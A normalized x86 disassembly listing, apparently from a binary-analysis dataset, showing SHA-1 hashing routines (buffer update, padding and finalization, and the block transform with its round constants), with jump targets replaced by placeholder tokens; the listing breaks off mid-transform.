push edi
push esi
push ecx
push edx
call [ eax + 0xc ]
add esp 0x10
mov esi eax
mov eax [ esp + 0x8 ]
xor esi esi
push eax
call sub_1004ef60
add esp 0x4
mov eax esi
pop edi
pop esi
pop ecx
retn
sub_10039570
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi [ esp + 0x14 ]
push edi
test ebp ebp
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov ebx [ esp + 0x14 ]
mov ecx [ ebx + 0x14 ]
lea eax [ ecx + ebp * 8 ]
cmp eax ecx
jae r-xdata
mov edx [ ebx + 0x18 ]
mov ecx ebp
shr ecx 0x1d
mov [ ebx + 0x14 ] eax
mov eax [ ebx + 0x5c ]
add edx ecx
test eax eax
mov [ ebx + 0x18 ] edx
je r-xdata
inc [ ebx + 0x18 ]
mov edi ebp
shr edi 0x6
je r-xdata
cmp ebp 0x40
lea edx [ ebx + 0x1c ]
jae r-xdata
test ebp ebp
je r-xdata
push edi
push esi
push ebx
call sub_10039810
shl edi 0x6
add esp 0xc
add esi edi
sub ebp edi
mov ecx 0x40
lea edi [ edx + eax ]
sub ecx eax
push 0x1
mov [ esp + 0x20 ] ecx
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push edx
and ecx 0x3
push ebx
[ edi ] [ esi ]
call sub_10039810
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
add esp 0xc
sub ebp eax
lea esi [ eax + ecx ]
mov ecx 0x10
xor eax eax
lea edi [ ebx + 0x1c ]
mov [ ebx + 0x5c ] 0x0
[ edi ]
lea ecx [ eax + ebp ]
cmp ecx 0x40
jae r-xdata
mov ecx ebp
lea edi [ ebx + 0x1c ]
mov edx ecx
mov [ ebx + 0x5c ] ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx ebp
lea edi [ edx + eax ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x5c ]
pop edi
add eax ebp
pop esi
mov [ ebx + 0x5c ] eax
pop ebp
mov eax 0x1
pop ebx
retn
sub_10039670
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov edi [ ebx + 0x5c ]
lea esi [ ebx + 0x1c ]
mov [ edi + esi ] 0x80
inc edi
cmp edi 0x38
jbe r-xdata
mov ecx 0x38
xor eax eax
sub ecx edi
add edi esi
mov edx ecx
add esi 0x38
shr ecx 0x2
[ edi ]
mov ecx edx
push 0x1
and ecx 0x3
[ edi ]
mov eax [ ebx + 0x18 ]
shr eax 0x18
mov [ esi ] al
mov ecx [ ebx + 0x18 ]
inc esi
shr ecx 0x10
mov [ esi ] cl
mov edx [ ebx + 0x18 ]
inc esi
shr edx 0x8
mov [ esi ] dl
mov al [ ebx + 0x18 ]
inc esi
mov [ esi ] al
mov ecx [ ebx + 0x14 ]
inc esi
shr ecx 0x18
mov [ esi ] cl
mov edx [ ebx + 0x14 ]
inc esi
shr edx 0x10
mov [ esi ] dl
mov eax [ ebx + 0x14 ]
inc esi
shr eax 0x8
mov [ esi ] al
mov cl [ ebx + 0x14 ]
inc esi
mov [ esi ] cl
sub esi 0x3f
push esi
push ebx
call sub_10039810
mov ecx 0x10
xor eax eax
mov edi esi
mov [ ebx + 0x5c ] 0x0
[ edi ]
mov ecx [ ebx ]
mov eax [ esp + 0x1c ]
mov edx ecx
add esp 0xc
shr edx 0x18
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x8
mov [ eax ] dl
inc eax
mov [ eax ] cl
mov ecx [ ebx + 0x4 ]
mov edx ecx
inc eax
shr edx 0x18
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x8
mov [ eax ] dl
inc eax
mov [ eax ] cl
mov ecx [ ebx + 0x8 ]
inc eax
mov edx ecx
pop edi
shr edx 0x18
mov [ eax ] dl
mov edx ecx
inc eax
pop esi
shr edx 0x10
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x8
mov [ eax ] dl
inc eax
mov [ eax ] cl
mov ecx [ ebx + 0xc ]
mov edx ecx
inc eax
shr edx 0x18
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x8
mov [ eax ] dl
inc eax
mov [ eax ] cl
mov ebx [ ebx + 0x10 ]
mov ecx ebx
inc eax
shr ecx 0x18
mov [ eax ] cl
mov edx ebx
inc eax
mov ecx ebx
shr edx 0x10
mov [ eax ] dl
inc eax
shr ecx 0x8
mov [ eax ] cl
mov [ eax + 0x1 ] bl
mov eax 0x1
pop ebx
retn
mov ecx 0x40
xor eax eax
sub ecx edi
add edi esi
mov edx ecx
push 0x1
shr ecx 0x2
[ edi ]
mov ecx edx
push esi
and ecx 0x3
push ebx
[ edi ]
xor edi edi
call sub_10039810
add esp 0xc
sub_10039810
mov eax 0x50
call sub_1001d0d0
mov ecx [ esp + 0x54 ]
mov eax [ esp + 0x58 ]
push ebx
push ebp
mov ebp [ ecx ]
push esi
push edi
mov edi [ ecx + 0x4 ]
mov edx [ ecx + 0x8 ]
mov ebx [ ecx + 0xc ]
mov ecx [ ecx + 0x10 ]
mov [ esp + 0x68 ] edx
xor edx edx
mov [ esp + 0x18 ] ecx
mov dl [ eax ]
xor ecx ecx
mov cl [ eax + 0x1 ]
mov [ esp + 0x10 ] ebx
shl edx 0x18
inc eax
shl ecx 0x10
or edx ecx
inc eax
xor ecx ecx
mov ch [ eax ]
or edx ecx
inc eax
xor ecx ecx
mov cl [ eax ]
or edx ecx
inc eax
mov esi edx
xor edx edx
mov dl [ eax ]
xor ecx ecx
mov cl [ eax + 0x1 ]
mov [ esp + 0x50 ] esi
shl edx 0x18
inc eax
shl ecx 0x10
or edx ecx
inc eax
xor ecx ecx
mov ch [ eax ]
or edx ecx
inc eax
xor ecx ecx
mov cl [ eax ]
or edx ecx
mov ecx ebx
xor ecx [ esp + 0x68 ]
mov [ esp + 0x4c ] edx
mov edx ebp
inc eax
rol edx 0x5
and ecx edi
add esi edx
mov edx [ esp + 0x18 ]
xor ecx ebx
add ecx esi
rol edi 0x1e
lea esi [ ecx + edx + 0x5a827999 ]
xor ecx ecx
mov cl [ eax ]
xor edx edx
mov dl [ eax + 0x1 ]
mov ebx edi
shl ecx 0x18
inc eax
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
or ecx edx
mov edx esi
mov [ esp + 0x24 ] ecx
mov ecx [ esp + 0x68 ]
mov edi ecx
inc eax
xor edi ebx
and edi ebp
rol edx 0x5
xor edi ecx
mov ecx [ esp + 0x4c ]
add ecx edx
mov edx [ esp + 0x10 ]
add edi ecx
xor ecx ecx
mov cl [ eax ]
shl ecx 0x18
lea edi [ edi + edx + 0x5a827999 ]
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
or ecx edx
mov edx ebx
rol ebp 0x1e
mov [ esp + 0x2c ] ecx
mov ecx edi
xor edx ebp
mov [ esp + 0x14 ] ebp
mov ebp [ esp + 0x24 ]
and edx esi
rol ecx 0x5
xor edx ebx
add ebp ecx
mov ecx [ esp + 0x68 ]
add edx ebp
inc eax
lea ebp [ edx + ecx + 0x5a827999 ]
xor edx edx
mov dl [ eax ]
xor ecx ecx
mov cl [ eax + 0x1 ]
shl edx 0x18
inc eax
shl ecx 0x10
or edx ecx
inc eax
xor ecx ecx
mov ch [ eax ]
or edx ecx
inc eax
xor ecx ecx
mov cl [ eax ]
rol esi 0x1e
or edx ecx
mov ecx [ esp + 0x14 ]
mov [ esp + 0x20 ] esi
xor esi ecx
mov [ esp + 0x34 ] edx
and esi edi
mov edx ebp
xor esi ecx
mov ecx [ esp + 0x2c ]
inc eax
rol edx 0x5
add ecx edx
xor edx edx
add esi ecx
xor ecx ecx
mov cl [ eax ]
mov dl [ eax + 0x1 ]
shl ecx 0x18
inc eax
lea esi [ esi + ebx + 0x5a827999 ]
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dh [ eax ]
rol edi 0x1e
or ecx edx
inc eax
mov ebx edi
xor edx edx
mov dl [ eax ]
or ecx edx
mov edx esi
mov [ esp + 0x3c ] ecx
mov ecx [ esp + 0x20 ]
mov edi ecx
inc eax
xor edi ebx
and edi ebp
xor edi ecx
mov ecx [ esp + 0x34 ]
rol edx 0x5
add ecx edx
mov edx [ esp + 0x14 ]
add edi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
lea edi [ edi + edx + 0x5a827999 ]
xor edx edx
mov dl [ eax ]
shl edx 0x18
inc eax
shl ecx 0x10
or edx ecx
inc eax
xor ecx ecx
mov ch [ eax ]
or edx ecx
inc eax
xor ecx ecx
mov cl [ eax ]
or edx ecx
mov ecx ebx
rol ebp 0x1e
mov [ esp + 0x44 ] edx
mov edx edi
xor ecx ebp
mov [ esp + 0x10 ] ebp
mov ebp [ esp + 0x3c ]
and ecx esi
rol edx 0x5
xor ecx ebx
add ebp edx
mov edx [ esp + 0x20 ]
add ecx ebp
inc eax
lea ebp [ ecx + edx + 0x5a827999 ]
xor ecx ecx
mov cl [ eax ]
xor edx edx
mov dl [ eax + 0x1 ]
shl ecx 0x18
inc eax
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
or ecx edx
mov edx [ esp + 0x10 ]
rol esi 0x1e
xor edx esi
mov [ esp + 0x68 ] esi
mov esi [ esp + 0x10 ]
mov [ esp + 0x48 ] ecx
and edx edi
mov ecx ebp
xor edx esi
mov esi [ esp + 0x44 ]
rol ecx 0x5
add esi ecx
inc eax
add edx esi
rol edi 0x1e
lea esi [ edx + ebx + 0x5a827999 ]
mov ebx edi
xor edx edx
mov dl [ eax ]
xor ecx ecx
mov cl [ eax + 0x1 ]
shl edx 0x18
inc eax
shl ecx 0x10
or edx ecx
inc eax
xor ecx ecx
mov ch [ eax ]
or edx ecx
inc eax
xor ecx ecx
mov cl [ eax ]
or edx ecx
mov ecx [ esp + 0x68 ]
mov edi ecx
mov [ esp + 0x28 ] edx
xor edi ebx
mov edx esi
and edi ebp
inc eax
xor edi ecx
mov ecx [ esp + 0x48 ]
rol edx 0x5
add ecx edx
mov edx [ esp + 0x10 ]
add edi ecx
xor ecx ecx
mov cl [ eax ]
shl ecx 0x18
lea edi [ edi + edx + 0x5a827999 ]
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
or ecx edx
mov edx ebx
rol ebp 0x1e
mov [ esp + 0x30 ] ecx
mov ecx edi
xor edx ebp
mov [ esp + 0x14 ] ebp
mov ebp [ esp + 0x28 ]
and edx esi
rol ecx 0x5
xor edx ebx
add ebp ecx
mov ecx [ esp + 0x68 ]
add edx ebp
inc eax
lea ebp [ edx + ecx + 0x5a827999 ]
xor edx edx
mov dl [ eax ]
xor ecx ecx
mov cl [ eax + 0x1 ]
shl edx 0x18
inc eax
shl ecx 0x10
or edx ecx
inc eax
xor ecx ecx
mov ch [ eax ]
or edx ecx
inc eax
xor ecx ecx
mov cl [ eax ]
or edx ecx
inc eax
rol esi 0x1e
mov [ esp + 0x38 ] edx
mov [ esp + 0x20 ] esi
mov edx ebp
mov ecx [ esp + 0x14 ]
xor esi ecx
and esi edi
xor esi ecx
mov ecx [ esp + 0x30 ]
rol edx 0x5
add ecx edx
xor edx edx
add esi ecx
xor ecx ecx
mov cl [ eax ]
mov dl [ eax + 0x1 ]
shl ecx 0x18
inc eax
lea esi [ esi + ebx + 0x5a827999 ]
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
or ecx edx
mov edx esi
rol edi 0x1e
mov [ esp + 0x40 ] ecx
mov ecx [ esp + 0x20 ]
mov ebx edi
mov edi ecx
xor edi ebx
inc eax
and edi ebp
xor edi ecx
mov ecx [ esp + 0x38 ]
rol edx 0x5
add ecx edx
mov edx [ esp + 0x14 ]
add edi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
lea edi [ edi + edx + 0x5a827999 ]
xor edx edx
mov dl [ eax ]
shl edx 0x18
inc eax
shl ecx 0x10
or edx ecx
inc eax
xor ecx ecx
mov ch [ eax ]
or edx ecx
inc eax
xor ecx ecx
mov cl [ eax ]
or edx ecx
mov ecx ebx
rol ebp 0x1e
mov [ esp + 0x58 ] edx
mov edx edi
xor ecx ebp
mov [ esp + 0x10 ] ebp
mov ebp [ esp + 0x40 ]
and ecx esi
rol edx 0x5
xor ecx ebx
add ebp edx
mov edx [ esp + 0x20 ]
add ecx ebp
inc eax
lea ebp [ ecx + edx + 0x5a827999 ]
xor ecx ecx
mov cl [ eax ]
xor edx edx
mov dl [ eax + 0x1 ]
shl ecx 0x18
inc eax
rol esi 0x1e
mov [ esp + 0x68 ] esi
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
or ecx edx
mov edx [ esp + 0x10 ]
xor edx esi
mov esi [ esp + 0x10 ]
mov [ esp + 0x54 ] ecx
and edx edi
mov ecx ebp
xor edx esi
mov esi [ esp + 0x58 ]
inc eax
rol ecx 0x5
add esi ecx
xor ecx ecx
mov cl [ eax ]
add edx esi
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
lea edx [ edx + ebx + 0x5a827999 ]
shl esi 0x18
inc eax
mov ebx [ esp + 0x68 ]
shl ecx 0x10
or esi ecx
inc eax
xor ecx ecx
mov ch [ eax ]
or esi ecx
inc eax
rol edi 0x1e
xor ecx ecx
xor ebx edi
mov cl [ eax ]
mov [ esp + 0x1c ] edi
mov edi [ esp + 0x68 ]
or esi ecx
and ebx ebp
mov ecx edx
xor ebx edi
mov edi [ esp + 0x54 ]
rol ecx 0x5
add edi ecx
mov ecx [ esp + 0x10 ]
add ebx edi
inc eax
rol ebp 0x1e
lea edi [ ebx + ecx + 0x5a827999 ]
xor ecx ecx
mov cl [ eax ]
xor ebx ebx
mov bl [ eax + 0x1 ]
mov [ esp + 0x14 ] ebp
shl ecx 0x18
inc eax
mov [ esp + 0x18 ] edi
shl ebx 0x10
or ecx ebx
inc eax
xor ebx ebx
mov bh [ eax ]
or ecx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
or ecx ebx
mov ebx [ esp + 0x1c ]
xor ebx ebp
mov ebp [ esp + 0x1c ]
and ebx edx
inc eax
rol edi 0x5
xor ebx ebp
mov ebp esi
add ebp edi
mov edi [ esp + 0x68 ]
add ebx ebp
rol edx 0x1e
lea edi [ ebx + edi + 0x5a827999 ]
mov ebp edx
mov [ esp + 0x10 ] edi
mov ebx edi
mov edi [ esp + 0x14 ]
mov [ esp + 0x20 ] edx
mov edx [ esp + 0x18 ]
xor ebp edi
and ebp edx
xor ebp edi
mov edi ecx
rol ebx 0x5
add edi ebx
add ebp edi
mov edi [ esp + 0x1c ]
rol edx 0x1e
lea edi [ edi + ebp + 0x5a827999 ]
mov ebp [ esp + 0x28 ]
mov ebx edx
mov edx [ esp + 0x54 ]
xor edx ebp
mov ebp [ esp + 0x24 ]
xor edx ebp
mov ebp [ esp + 0x50 ]
xor edx ebp
mov ebp edi
rol edx 0x1
rol ebp 0x5
mov [ esp + 0x5c ] ebp
mov ebp [ esp + 0x20 ]
mov [ esp + 0x18 ] ebx
xor ebp ebx
mov ebx [ esp + 0x10 ]
mov [ esp + 0x68 ] edi
mov edi [ esp + 0x20 ]
and ebp ebx
mov ebx [ esp + 0x5c ]
xor ebp edi
mov edi [ esp + 0x14 ]
mov [ esp + 0x50 ] edx
add edi ebx
add ebp edi
mov edi [ esp + 0x10 ]
rol edi 0x1e
lea edx [ edx + ebp + 0x5a827999 ]
mov ebp [ esp + 0x30 ]
mov ebx edi
mov edi esi
xor edi ebp
mov ebp [ esp + 0x2c ]
xor edi ebp
mov ebp [ esp + 0x4c ]
xor edi ebp
mov ebp edx
rol edi 0x1
rol ebp 0x5
mov [ esp + 0x5c ] ebp
mov ebp [ esp + 0x18 ]
mov [ esp + 0x10 ] ebx
xor ebp ebx
mov ebx [ esp + 0x68 ]
mov [ esp + 0x1c ] edx
mov edx [ esp + 0x18 ]
and ebp ebx
mov ebx [ esp + 0x5c ]
xor ebp edx
mov edx [ esp + 0x20 ]
mov [ esp + 0x4c ] edi
add edx ebx
add ebp edx
mov edx [ esp + 0x68 ]
rol edx 0x1e
lea edi [ edi + ebp + 0x5a827999 ]
mov ebx edx
mov [ esp + 0x14 ] edi
mov [ esp + 0x68 ] ebx
mov edx ecx
mov ebp [ esp + 0x38 ]
xor edx ebp
mov ebp [ esp + 0x34 ]
xor edx ebp
mov ebp [ esp + 0x24 ]
xor edx ebp
mov ebp edi
rol edx 0x1
rol ebp 0x5
mov edi [ esp + 0x10 ]
mov [ esp + 0x5c ] ebp
mov ebp [ esp + 0x10 ]
mov [ esp + 0x24 ] edx
xor ebp ebx
mov ebx [ esp + 0x1c ]
and ebp ebx
mov ebx [ esp + 0x5c ]
xor ebp edi
mov edi [ esp + 0x18 ]
add edi ebx
add ebp edi
mov edi [ esp + 0x1c ]
rol edi 0x1e
lea edx [ edx + ebp + 0x5a827999 ]
mov ebp [ esp + 0x3c ]
mov ebx edi
mov edi [ esp + 0x40 ]
xor edi ebp
mov ebp [ esp + 0x2c ]
xor edi ebp
mov ebp [ esp + 0x50 ]
xor edi ebp
mov ebp edx
rol edi 0x1
rol ebp 0x5
mov [ esp + 0x5c ] ebp
mov ebp [ esp + 0x68 ]
mov [ esp + 0x1c ] ebx
xor ebp ebx
mov ebx [ esp + 0x14 ]
mov [ esp + 0x20 ] edx
mov edx [ esp + 0x68 ]
and ebp ebx
mov ebx [ esp + 0x5c ]
xor ebp edx
mov edx [ esp + 0x10 ]
mov [ esp + 0x2c ] edi
add edx ebx
mov ebx [ esp + 0x34 ]
add ebp edx
mov edx [ esp + 0x14 ]
rol edx 0x1e
lea edi [ edi + ebp + 0x5a827999 ]
mov ebp [ esp + 0x44 ]
mov [ esp + 0x14 ] edx
mov edx [ esp + 0x58 ]
xor edx ebp
mov ebp [ esp + 0x4c ]
xor edx ebx
mov [ esp + 0x18 ] edi
xor edx ebp
mov ebp [ esp + 0x20 ]
mov ebx edi
mov edi [ esp + 0x1c ]
xor ebp edi
mov edi [ esp + 0x14 ]
rol edx 0x1
xor ebp edi
mov edi [ esp + 0x68 ]
rol ebx 0x5
add edi ebx
mov [ esp + 0x34 ] edx
add ebp edi
mov edi [ esp + 0x20 ]
rol edi 0x1e
lea edx [ edx + ebp + 0x6ed9eba1 ]
mov ebp [ esp + 0x48 ]
mov ebx edi
mov edi [ esp + 0x54 ]
mov [ esp + 0x10 ] edx
mov [ esp + 0x20 ] ebx
xor edi ebp
mov ebp [ esp + 0x3c ]
xor edi ebp
mov ebp [ esp + 0x24 ]
xor edi ebp
mov ebp edx
mov edx [ esp + 0x18 ]
xor ebx edx
mov edx [ esp + 0x14 ]
rol edi 0x1
xor ebx edx
mov edx [ esp + 0x1c ]
rol ebp 0x5
add edx ebp
mov ebp [ esp + 0x28 ]
add ebx edx
mov edx [ esp + 0x18 ]
mov [ esp + 0x3c ] edi
rol edx 0x1e
lea edi [ edi + ebx + 0x6ed9eba1 ]
mov ebx edx
mov edx esi
mov [ esp + 0x68 ] edi
xor edx ebp
mov ebp [ esp + 0x44 ]
xor edx ebp
mov ebp [ esp + 0x2c ]
xor edx ebp
mov ebp edi
mov edi [ esp + 0x10 ]
mov [ esp + 0x18 ] ebx
rol edx 0x1
rol ebp 0x5
mov [ esp + 0x5c ] ebp
mov ebp [ esp + 0x20 ]
xor ebp ebx
mov ebx [ esp + 0x5c ]
xor ebp edi
mov edi [ esp + 0x14 ]
add edi ebx
mov [ esp + 0x44 ] edx
add ebp edi
mov edi [ esp + 0x10 ]
rol edi 0x1e
lea edx [ edx + ebp + 0x6ed9eba1 ]
mov ebp [ esp + 0x30 ]
mov ebx edi
mov edi ecx
xor edi ebp
mov ebp [ esp + 0x48 ]
xor edi ebp
mov ebp [ esp + 0x34 ]
xor edi ebp
mov ebp edx
rol edi 0x1
rol ebp 0x5
mov [ esp + 0x5c ] ebp
mov ebp [ esp + 0x18 ]
mov [ esp + 0x1c ] edx
mov edx [ esp + 0x68 ]
xor ebp ebx
mov [ esp + 0x10 ] ebx
mov ebx [ esp + 0x5c ]
xor ebp edx
mov edx [ esp + 0x20 ]
mov [ esp + 0x48 ] edi
add edx ebx
add ebp edx
mov edx [ esp + 0x68 ]
rol edx 0x1e
lea edi [ edi + ebp + 0x6ed9eba1 ]
mov ebp [ esp + 0x28 ]
mov ebx edx
mov edx [ esp + 0x38 ]
xor edx ebp
mov ebp [ esp + 0x3c ]
xor edx ebp
mov ebp [ esp + 0x50 ]
mov [ esp + 0x14 ] edi
mov [ esp + 0x68 ] ebx
xor edx ebp
mov ebp edi
mov edi [ esp + 0x1c ]
rol edx 0x1
rol ebp 0x5
mov [ esp + 0x5c ] ebp
mov ebp [ esp + 0x10 ]
xor ebp ebx
mov ebx [ esp + 0x5c ]
xor ebp edi
mov edi [ esp + 0x18 ]
add edi ebx
mov [ esp + 0x28 ] edx
add ebp edi
mov edi [ esp + 0x1c ]
rol edi 0x1e
lea edx [ edx + ebp + 0x6ed9eba1 ]
mov ebp [ esp + 0x30 ]
mov ebx edi
mov edi [ esp + 0x40 ]
xor edi ebp
mov ebp [ esp + 0x44 ]
xor edi ebp
mov ebp [ esp + 0x4c ]
xor edi ebp
mov ebp edx
rol edi 0x1
rol ebp 0x5
mov [ esp + 0x5c ] ebp
mov ebp [ esp + 0x68 ]
mov [ esp + 0x20 ] edx
mov edx [ esp + 0x14 ]
xor ebp ebx
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x5c ]
xor ebp edx
mov edx [ esp + 0x10 ]
mov [ esp + 0x30 ] edi
add edx ebx
mov ebx [ esp + 0x48 ]
add ebp edx
mov edx [ esp + 0x14 ]
rol edx 0x1e
lea edi [ edi + ebp + 0x6ed9eba1 ]
mov ebp [ esp + 0x38 ]
mov [ esp + 0x14 ] edx
mov edx [ esp + 0x58 ]
xor edx ebp
mov ebp [ esp + 0x24 ]
xor edx ebx
mov [ esp + 0x18 ] edi
xor edx ebp
mov ebp [ esp + 0x20 ]
mov ebx edi
mov edi [ esp + 0x1c ]
xor ebp edi
mov edi [ esp + 0x14 ]
rol edx 0x1
xor ebp edi
mov edi [ esp + 0x68 ]
rol ebx 0x5
add edi ebx
mov [ esp + 0x38 ] edx
add ebp edi
mov edi [ esp + 0x20 ]
rol edi 0x1e
lea edx [ edx + ebp + 0x6ed9eba1 ]
mov ebp [ esp + 0x40 ]
mov ebx edi
mov edi [ esp + 0x54 ]
xor edi ebp
mov ebp [ esp + 0x28 ]
xor edi ebp
mov ebp [ esp + 0x2c ]
xor edi ebp
mov ebp edx
rol edi 0x1
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x18 ]
mov [ esp + 0x20 ] ebx
mov [ esp + 0x40 ] edi
rol ebp 0x5
xor ebx edx
mov edx [ esp + 0x14 ]
xor ebx edx
mov edx [ esp + 0x1c ]
add edx ebp
mov ebp [ esp + 0x58 ]
add ebx edx
mov edx [ esp + 0x18 ]
rol edx 0x1e
lea edi [ edi + ebx + 0x6ed9eba1 ]
mov ebx edx
mov edx esi
mov [ esp + 0x68 ] edi
xor edx ebp
mov ebp [ esp + 0x30 ]
xor edx ebp
mov ebp [ esp + 0x34 ]
xor edx ebp
mov ebp edi
mov edi [ esp + 0x10 ]
mov [ esp + 0x18 ] ebx
rol edx 0x1
rol ebp 0x5
mov [ esp + 0x5c ] ebp
mov ebp [ esp + 0x20 ]
xor ebp ebx
mov ebx [ esp + 0x5c ]
xor ebp edi
mov edi [ esp + 0x14 ]
add edi ebx
mov [ esp + 0x58 ] edx
add ebp edi
lea edi [ edx + ebp + 0x6ed9eba1 ]
mov edx [ esp + 0x10 ]
mov ebp [ esp + 0x54 ]
mov [ esp + 0x1c ] edi
rol edx 0x1e
mov ebx edx
mov edx ecx
xor edx ebp
mov ebp [ esp + 0x38 ]
xor edx ebp
mov ebp [ esp + 0x3c ]
xor edx ebp
mov ebp edi
mov edi [ esp + 0x68 ]
mov [ esp + 0x10 ] ebx
rol edx 0x1
rol ebp 0x5
mov [ esp + 0x5c ] ebp
mov ebp [ esp + 0x18 ]
xor ebp ebx
mov ebx [ esp + 0x5c ]
xor ebp edi
mov edi [ esp + 0x20 ]
add edi ebx
mov [ esp + 0x54 ] edx
add ebp edi
lea edi [ edx + ebp + 0x6ed9eba1 ]
mov edx [ esp + 0x68 ]
mov ebp [ esp + 0x44 ]
rol edx 0x1e
mov ebx edx
mov edx [ esp + 0x40 ]
xor esi edx
mov edx [ esp + 0x50 ]
xor esi ebp
mov ebp edi
xor esi edx
mov [ esp + 0x68 ] ebx
rol esi 0x1
rol ebp 0x5
mov [ esp + 0x5c ] ebp
mov ebp [ esp + 0x10 ]
mov [ esp + 0x20 ] esi
mov edx esi
mov esi [ esp + 0x1c ]
xor ebp ebx
mov ebx [ esp + 0x5c ]
xor ebp esi
mov esi [ esp + 0x18 ]
add esi ebx
add ebp esi
mov esi edx
lea ebx [ esi + ebp + 0x6ed9eba1 ]
mov ebp [ esp + 0x58 ]
mov esi [ esp + 0x1c ]
xor ecx ebp
mov ebp [ esp + 0x48 ]
mov [ esp + 0x20 ] ebx
xor ecx ebp
mov ebp [ esp + 0x4c ]
xor ecx ebp
mov ebp [ esp + 0x68 ]
rol esi 0x1e
xor ebp esi
mov [ esp + 0x1c ] esi
mov esi [ esp + 0x10 ]
xor ebp edi
rol ecx 0x1
rol ebx 0x5
add esi ebx
mov [ esp + 0x18 ] ecx
add ebp esi
mov esi ecx
rol edi 0x1e
lea ebx [ esi + ebp + 0x6ed9eba1 ]
mov esi [ esp + 0x54 ]
mov ebp [ esp + 0x28 ]
mov [ esp + 0x14 ] edi
mov edi [ esp + 0x24 ]
xor esi ebp
mov ebp [ esp + 0x50 ]
xor esi edi
mov edi [ esp + 0x1c ]
xor esi ebp
mov ebp [ esp + 0x20 ]
mov [ esp + 0x18 ] ebx
xor ebp edi
mov edi [ esp + 0x14 ]
rol esi 0x1
xor ebp edi
mov edi [ esp + 0x68 ]
rol ebx 0x5
add edi ebx
mov [ esp + 0x50 ] esi
add ebp edi
mov edi [ esp + 0x20 ]
rol edi 0x1e
lea esi [ esi + ebp + 0x6ed9eba1 ]
mov ebp [ esp + 0x30 ]
mov ebx edi
mov edi edx
xor edi ebp
mov ebp [ esp + 0x2c ]
xor edi ebp
mov ebp [ esp + 0x4c ]
xor edi ebp
mov [ esp + 0x10 ] esi
mov ebp esi
mov esi [ esp + 0x18 ]
mov [ esp + 0x20 ] ebx
xor ebx esi
mov esi [ esp + 0x14 ]
rol edi 0x1
xor ebx esi
mov esi [ esp + 0x1c ]
rol ebp 0x5
add esi ebp
mov ebp [ esp + 0x38 ]
add ebx esi
mov esi [ esp + 0x18 ]
mov [ esp + 0x4c ] edi
rol esi 0x1e
lea edi [ edi + ebx + 0x6ed9eba1 ]
mov ebx esi
mov esi ecx
mov [ esp + 0x68 ] edi
xor esi ebp
mov ebp [ esp + 0x34 ]
mov [ esp + 0x18 ] ebx
xor esi ebp
mov ebp [ esp + 0x24 ]
xor esi ebp
mov ebp edi
mov edi [ esp + 0x10 ]
rol esi 0x1
rol ebp 0x5
mov [ esp + 0x5c ] ebp
mov ebp [ esp + 0x20 ]
xor ebp ebx
mov ebx [ esp + 0x5c ]
xor ebp edi
mov edi [ esp + 0x14 ]
add edi ebx
mov [ esp + 0x24 ] esi
add ebp edi
mov edi [ esp + 0x10 ]
rol edi 0x1e
lea esi [ esi + ebp + 0x6ed9eba1 ]
mov ebp [ esp + 0x3c ]
mov ebx edi
mov edi [ esp + 0x40 ]
xor edi ebp
mov ebp [ esp + 0x2c ]
xor edi ebp
mov ebp [ esp + 0x50 ]
xor edi ebp
mov ebp esi
rol edi 0x1
rol ebp 0x5
mov [ esp + 0x5c ] ebp
mov ebp [ esp + 0x18 ]
mov [ esp + 0x1c ] esi
mov esi [ esp + 0x68 ]
xor ebp ebx
mov [ esp + 0x10 ] ebx
mov ebx [ esp + 0x5c ]
xor ebp esi
mov esi [ esp + 0x20 ]
mov [ esp + 0x2c ] edi
add esi ebx
add ebp esi
mov esi [ esp + 0x68 ]
rol esi 0x1e
lea edi [ edi + ebp + 0x6ed9eba1 ]
mov ebp [ esp + 0x44 ]
mov ebx esi
mov esi [ esp + 0x58 ]
xor esi ebp
mov ebp [ esp + 0x34 ]
xor esi ebp
mov ebp [ esp + 0x4c ]
xor esi ebp
mov ebp edi
rol esi 0x1
rol ebp 0x5
mov [ esp + 0x5c ] ebp
mov ebp [ esp + 0x10 ]
mov [ esp + 0x14 ] edi
mov edi [ esp + 0x1c ]
xor ebp ebx
mov [ esp + 0x68 ] ebx
mov ebx [ esp + 0x5c ]
xor ebp edi
mov edi [ esp + 0x18 ]
mov [ esp + 0x34 ] esi
add edi ebx
add ebp edi
mov edi [ esp + 0x1c ]
rol edi 0x1e
lea esi [ esi + ebp + 0x6ed9eba1 ]
mov ebp [ esp + 0x48 ]
mov ebx edi
mov edi [ esp + 0x54 ]
